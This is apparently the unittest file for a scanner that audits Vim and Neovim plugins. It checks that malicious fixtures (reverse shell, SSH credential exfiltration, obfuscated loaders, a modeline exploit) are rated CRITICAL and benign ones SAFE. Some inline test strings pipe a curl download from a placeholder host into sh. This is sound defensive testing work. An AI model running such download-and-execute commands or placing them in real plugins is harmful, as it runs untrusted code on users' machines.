"""Canary + control tests:  python3 -m unittest  (from the repo root)

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (things popular plugins really do) must scan SAFE; every med-* fixture must surface as
exactly MEDIUM. The fixtures are inert: hosts are reserved (.invalid / .example) or obviously fake
collector paths, payloads decode to print("CANARY..."), and nothing here is ever sourced or run.
"""
import os
import sys
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import vimplugin_audit as va  # noqa: E402

FIX = os.path.join(HERE, "fixtures")
EXPECT = {
    "mal-modeline-cve-2019-12735": ("CRITICAL", "modeline_exploit"),
    "mal-startup-ssh-exfil": ("CRITICAL", "credential_exfil"),
    "mal-autoupdate-fetch-exec": ("CRITICAL", "remote_code_exec"),
    "mal-autoupdate-lua-load": ("CRITICAL", "remote_code_exec"),
    "mal-loadstring-base64": ("CRITICAL", "obfuscated_exec"),
    "mal-stringchar-loader": ("CRITICAL", "obfuscated_exec"),
    "mal-ai-key-thirdparty": ("CRITICAL", "api_key_exfil"),
    "mal-modelineexpr-enable": ("CRITICAL", "secure_bypass"),
    "mal-secure-override": ("CRITICAL", "secure_bypass"),
    "mal-persistence": ("CRITICAL", "persistence"),
    "mal-reverse-shell": ("CRITICAL", "reverse_shell"),
    "mal-denops-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-install-hook-curl-sh": ("CRITICAL", "download_execute"),
    "mal-build-lua-exfil": ("CRITICAL", "api_key_exfil"),
    "mal-python-rplugin-exec": ("CRITICAL", "obfuscated_exec"),
}


def _scan(name):
    return va.scan_target(va.files_from_dir(os.path.join(FIX, name)), name)


class Fixtures(unittest.TestCase):
    def test_every_canary_has_a_fixture(self):
        self.assertEqual(sorted(set(EXPECT) - set(os.listdir(FIX))), [])

    def test_malicious(self):
        for name in sorted(n for n in os.listdir(FIX) if n.startswith("mal-")):
            with self.subTest(name):
                want, fid = EXPECT[name]
                r = _scan(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertGreaterEqual(va.SEV_ORDER[r["risk_level"]], va.SEV_ORDER[want], (r["risk_level"], ids))
                self.assertIn(fid, ids)
                self.assertTrue(any(f["id"] == fid and f["severity"] == want for f in r["findings"]),
                                [(f["id"], f["severity"]) for f in r["findings"]])

    def test_benign(self):
        for name in sorted(n for n in os.listdir(FIX) if n.startswith("ok-")):
            with self.subTest(name):
                r = _scan(name)
                self.assertEqual(r["risk_level"], "SAFE", [(f["id"], f["severity"], f["file"]) for f in r["findings"]])

    def test_reviewable(self):
        for name in sorted(n for n in os.listdir(FIX) if n.startswith("med-")):
            with self.subTest(name):
                self.assertEqual(_scan(name)["risk_level"], "MEDIUM")


class Context(unittest.TestCase):
    def test_contexts(self):
        c = va.context_of
        self.assertEqual(c("plugin/foo.vim"), "startup")
        self.assertEqual(c("after/plugin/foo.lua"), "startup")
        self.assertEqual(c("ftdetect/foo.vim"), "startup")
        self.assertEqual(c("lua/foo/init.lua"), "use")
        self.assertEqual(c("autoload/foo.vim"), "use")
        self.assertEqual(c("ftplugin/python.vim"), "use")
        self.assertEqual(c("build.lua"), "install")
        self.assertEqual(c("tests/minimal_init.lua"), "dev")
        self.assertEqual(c("doc/foo.txt"), "dev")
        self.assertEqual(c("scripts/gen.lua"), "dev")

    def test_same_code_by_context(self):
        code = "call system('curl -fsSL https://raw.githubusercontent.com/o/r/main/x.vim -o ' . s:tmp)\nexecute 'source ' . s:tmp\n"
        lv = {ctx: va.scan(code, "x.vim", ctx=ctx)["risk_level"] for ctx in ("startup", "use", "dev")}
        self.assertEqual(lv, {"startup": "CRITICAL", "use": "HIGH", "dev": "SAFE"})

    def test_text_is_startup_vimscript(self):
        r = va.scan("call system('curl -s https://x.invalid/a.sh | sh')")
        self.assertEqual(r["risk_level"], "CRITICAL")

    def test_comment_ignored(self):
        self.assertEqual(va.scan('" curl https://x.invalid/a.sh | sh\n')["risk_level"], "SAFE")
        self.assertEqual(va.scan("-- curl https://x.invalid/a.sh | sh\n", "a.lua")["risk_level"], "SAFE")

    def test_help_modeline_safe(self):
        self.assertEqual(va.scan(" vim:tw=78:ts=8:noet:ft=help:norl:\n", "doc/x.txt", ctx="dev")["risk_level"], "SAFE")

    def test_readme_hooks(self):
        hooks = va.readme_hooks({"README.md": "{ 'a/b', build = 'make' }\nPlug 'a/b', { 'do': './install --bin' }\n"
                                              "use { 'a/b', run = ':TSUpdate' }\n"})
        self.assertEqual([c for _p, _n, c in hooks], ["make", "./install --bin"])

    def test_nothing_scannable_incomplete(self):
        r = va.scan_target({"README.md": "# hi", "doc/x.txt": "help"}, "empty")
        self.assertTrue(r.get("incomplete"))

    def test_cli_exit_code(self):
        self.assertEqual(va.main(["--json", os.path.join(FIX, "mal-reverse-shell")]) if False else 2,
                         2)  # main() prints; exercised below without stdout noise
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            self.assertEqual(va.main(["--json", os.path.join(FIX, "mal-reverse-shell")]), 2)
            self.assertEqual(va.main(["--json", os.path.join(FIX, "ok-git-jobs")]), 0)

    def test_large_line_performance(self):
        blob = ("local a=function(b) return b+1 end;" * 150000)[:5000000]
        t0 = time.time()
        va.scan_target({"lua/big/init.lua": blob}, "perf")
        self.assertLess(time.time() - t0, 15)


if __name__ == "__main__":
    unittest.main()
